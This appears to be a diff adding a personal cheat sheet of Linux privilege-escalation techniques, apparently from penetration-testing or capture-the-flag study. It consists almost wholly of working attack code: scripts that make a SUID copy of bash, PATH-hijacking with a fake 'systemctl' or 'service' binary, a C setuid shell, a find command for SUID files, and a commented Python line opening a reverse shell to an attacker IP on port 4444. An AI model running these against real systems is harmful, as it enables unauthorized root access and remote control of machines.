@@ -1,0 +1,75 @@
+=================================== 
+Bash Script
+
+vim /home/user/overwrite.sh 
+#!/bin/bash 
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+chmod +x /home/user/overwrite.sh 
+watch -n 1 ls -l /tmp
+/tmp/rootbash -p
+
+
+
+=================================== 
+Path Injecting Rootbash 
+
+echo -e '#!/bin/sh' > /dev/shm/systemctl  
+echo -e '/bin/sh' >> /dev/shm/systemctl  
+chmod +x /dev/shm/systemctl                          
+echo $PATH
+export PATH=/dev/shm:$PATH
+./zabbix-service 
+
+
+=================================== 
+Python rootbash 
+
+#!/usr/bin/env python 
+import os 
+import sys 
+try: 
+    #os.system('/usr/bin/touch /tmp/hello')
+    #os.system('bash -i /dev/tcp/$MyIP/4444 0>&1')
+    #os.system('chmod 4755 /bin/bash')
+    os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +s /tmp/rbash') 
+except: 
+     sys.exit() 
+
+
+=================================== 
+C rootbash
+
+int main() {  
+    setuid(0); 
+    system("/bin/bash -p"); 
+} 
+gcc -o name filename.c 
+
+
+=================================== 
+Service Script
+
+'/usr/bin/kick' script calls 'service apache2 start' 
+Vulnerable since it tries to run 'service' as root without a full path 
+This will run 'service' from path instead of the 'real' command 
+
+find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
+/usr/bin/kick
+strings /usr/bin/kick
+strace -v -f -e execve /usr/bin/kick 2>&1 | grep service 
+
+vim service.c 
+int main() { 
+    setuid(0); 
+    system("/bin/bash -p"); 
+} 
+
+gcc -o service service.c 
+
+echo $PATH
+export PATH=.:$PATH
+/usr/bin/kick 
+root! 
+
